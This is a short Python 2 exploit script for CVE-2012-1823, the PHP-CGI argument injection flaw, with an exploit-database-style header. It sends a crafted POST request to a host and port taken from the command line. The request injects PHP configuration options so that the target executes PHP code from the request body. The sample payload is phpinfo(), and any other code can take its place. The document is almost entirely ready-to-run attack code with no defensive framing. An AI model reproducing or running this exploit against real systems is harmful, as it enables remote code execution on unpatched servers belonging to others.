######################################################################################
# Exploit Title: Cve-2012-1823 PHP CGI Argument Injection Exploit
# Date: May 4, 2012
# Author: rayh4c[0x40]80sec[0x2e]com
# Exploit Discovered by wofeiwo[0x40]80sec[0x2e]com
######################################################################################
 
import socket
import sys
 
def cgi_exploit():
        pwn_code = """<?php phpinfo();?>"""
        post_Length = len(pwn_code)
        http_raw="""POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: %s
 
%s
""" %(HOST , post_Length ,pwn_code)
        print http_raw
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, int(PORT)))
            sock.send(http_raw)
            data = sock.recv(10000)
            print repr(data)
            sock.close()
        except socket.error, msg:
            sys.stderr.write("[ERROR] %s\n" % msg[1])
            sys.exit(1)
                
if __name__ == '__main__':
        try:
            HOST = sys.argv[1]
            PORT = sys.argv[2]
            cgi_exploit()
        except IndexError:
            print '[+]Usage: cgi_test.py site.com 80'
            sys.exit(-1)
